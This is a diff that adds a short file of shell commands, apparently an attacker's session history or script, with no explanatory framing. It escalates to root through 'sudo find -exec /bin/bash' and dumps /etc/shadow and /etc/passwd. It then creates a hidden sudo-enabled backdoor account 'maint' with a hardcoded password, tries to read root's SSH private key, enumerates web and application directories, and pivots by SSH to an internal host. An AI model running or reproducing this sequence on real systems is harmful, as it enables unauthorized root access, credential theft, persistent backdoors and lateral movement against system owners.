@@ -1,0 +1,16 @@
+id
+whoami
+sudo /usr/bin/find /. -exec /bin/bash \; -quit
+id
+whoami
+cat /etc/shadow
+useradd -m -s /bin/bash maint
+echo 'maint:M41nt#2024' | chpasswd
+usermod -aG sudo maint
+cat /etc/passwd
+cat /root/.ssh/id_rsa 2>/dev/null
+ls /opt/
+ls /var/www/
+ssh devops@192.168.60.10
+ls /opt/helix/data/
+exit
